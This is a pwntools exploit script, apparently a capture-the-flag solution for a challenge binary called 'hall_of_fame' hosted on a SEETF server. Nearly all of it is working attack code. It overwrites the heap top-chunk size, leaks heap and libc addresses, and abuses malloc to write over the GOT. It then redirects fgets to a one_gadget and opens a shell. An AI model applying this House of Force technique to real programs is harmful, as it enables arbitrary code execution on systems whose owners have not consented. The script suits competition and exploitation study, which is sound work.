from pwn import *

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

exe = ELF("./hall_of_fame_patched")
libc = ELF("./libc-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("fun.chall.seetf.sg", 50004)

    return r

def add(r, score, name):
    r.sendlineafter(b'Choose> ', b'1')
    r.sendlineafter(b'score? > ', score)
    r.sendlineafter(b'Famer > ', name)

def view(r):
    r.sendlineafter(b'Choose> ', b'2')
    r.recvuntil(b'is at ')
    heap_pointer = int(r.recvuntil(b'\n').strip(), 16)
    r.recvuntil(b'is at ')
    leaked_puts = int(r.recvuntil(b'\n').strip(), 16)
    return heap_pointer, leaked_puts

r = conn()

# Overwrite top_chunk size with 0xFFFFFFFFFFFFFFFF
add(r, str(0x2).encode(), b'a'*0x10+p64(-1, signed=True)+p64(-1, signed=True))

# Get heap address and libc address
heap_pointer, leaked_puts = view(r)
log.info(f'Leaked heap: {hex(heap_pointer)}')
log.info(f'Leaked puts: {hex(leaked_puts)}')

# Calculate libc base address
libc.address = leaked_puts - libc.symbols['puts']
log.info(f'Libc base: {hex(libc.address)}')

# Calculate top chunk address
top = heap_pointer+0x18
log.info(f'Top Chunk: {hex(top)}')

# Calculate the correct malloc size, so that the top_chunk will point to 0x602000
num = 0x602000-top-0x8
log.info(f'Num: {num}')

# Call malloc, and after the call, top_chunk will point to 0x602000
add(r, str(num).encode(), p64(libc.address+0x10a2fc))

'''
Carefully craft payload to overwrite the GOT table,
so that only fgets got replaced with the one_gadget address

Notes that 0x602000 will contain the chunk metadata,
so when we next call malloc and fill its content, it
will start from 0x602010. So keep in mind that our
payload will start from 0x602010.

From observation in GDB, below is the GOT table structure
[0x602018] __stack_chk_fail@GLIBC_2.4  →  0x400716
[0x602020] printf@GLIBC_2.2.5  →  0x7ffff7a46e40
[0x602028] strcspn@GLIBC_2.2.5  →  0x400736
[0x602030] sbrk@GLIBC_2.2.5  →  0x7ffff7af8160
[0x602038] fgets@GLIBC_2.2.5  →  0x7ffff7a60ad0
'''
shell_addr = libc.address+0x10a2fc
payload =  p64(0) # Safe to be replaced by any bytes as it isn't the first GOT table entry address
payload += p64(libc.symbols['__stack_chk_fail'])
payload += p64(libc.symbols['printf'])
payload += p64(libc.symbols['strcspn'])
payload += p64(libc.symbols['sbrk'])
payload += p64(shell_addr) # Overwrite fgets

# Call malloc, and overwrite it
add(r, str(10).encode(), payload)

# We got our shell
r.interactive()
